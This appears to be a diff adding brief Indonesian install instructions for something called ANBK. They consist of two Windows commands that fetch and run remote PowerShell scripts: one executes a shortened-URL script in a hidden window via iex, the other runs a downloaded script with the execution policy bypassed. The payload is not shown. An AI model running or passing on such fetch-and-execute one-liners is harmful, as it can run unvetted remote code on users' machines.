@@ -1,0 +1,8 @@
+cara install
+
+c:\windows\system32\cmd.exe /c "powershell -w h iex(irm s.id/iexambanbk)"
+
+atau
+
+curl.exe -L -o installanbk.ps1 "https://raw.githubusercontent.com/smpraudlatulmusthofa-art/anbk/main/installanbk.ps1"
+powershell -ExecutionPolicy Bypass -File installanbk.ps1
